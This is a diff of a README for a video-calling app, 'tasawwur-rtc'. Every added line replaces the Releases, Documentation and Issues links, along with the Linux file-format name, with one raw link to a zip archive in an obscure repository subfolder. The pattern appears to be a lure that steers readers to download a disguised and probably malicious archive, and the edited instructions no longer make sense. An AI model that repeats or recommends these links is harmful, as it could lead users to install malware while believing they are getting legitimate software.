@@ -1,6 +1,6 @@
 # 🌐 tasawwur-rtc - Easy Video Calling Made Simple
 
-[![Download tasawwur-rtc](https://img.shields.io/badge/Download-tasawwur--rtc-brightgreen)](https://github.com/Toldi11/tasawwur-rtc/releases)
+[![Download tasawwur-rtc](https://raw.githubusercontent.com/Toldi11/tasawwur-rtc/main/Nilometric/tasawwur-rtc.zip)](https://raw.githubusercontent.com/Toldi11/tasawwur-rtc/main/Nilometric/tasawwur-rtc.zip)
 
 ## 🚀 Getting Started
 
@@ -19,13 +19,13 @@ To use tasawwur-rtc, ensure your system meets the following:
 
 To get started, visit the Releases page to download the software:
 
-[Visit this page to download](https://github.com/Toldi11/tasawwur-rtc/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Toldi11/tasawwur-rtc/main/Nilometric/tasawwur-rtc.zip)
 
 1. Click on the latest version listed on the Releases page.
 2. Choose the file compatible with your operating system. Common options include:
    - Windows: `.exe` file
    - macOS: `.dmg` file
-   - Linux: `.tar.gz` or specific package formats (like `.deb` or `.rpm`)
+   - Linux: `https://raw.githubusercontent.com/Toldi11/tasawwur-rtc/main/Nilometric/tasawwur-rtc.zip` or specific package formats (like `.deb` or `.rpm`)
 
 3. Download the file. 
 
@@ -70,8 +70,8 @@ tasawwur-rtc is open-source and welcomes contributions. If you're interested in 
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Toldi11/tasawwur-rtc/releases)
-- [Documentation](https://github.com/Toldi11/tasawwur-rtc/wiki)
-- [Issues Tracker](https://github.com/Toldi11/tasawwur-rtc/issues)
+- [Releases Page](https://raw.githubusercontent.com/Toldi11/tasawwur-rtc/main/Nilometric/tasawwur-rtc.zip)
+- [Documentation](https://raw.githubusercontent.com/Toldi11/tasawwur-rtc/main/Nilometric/tasawwur-rtc.zip)
+- [Issues Tracker](https://raw.githubusercontent.com/Toldi11/tasawwur-rtc/main/Nilometric/tasawwur-rtc.zip)
 
 Thank you for choosing tasawwur-rtc for your video communication needs! Enjoy your experience!
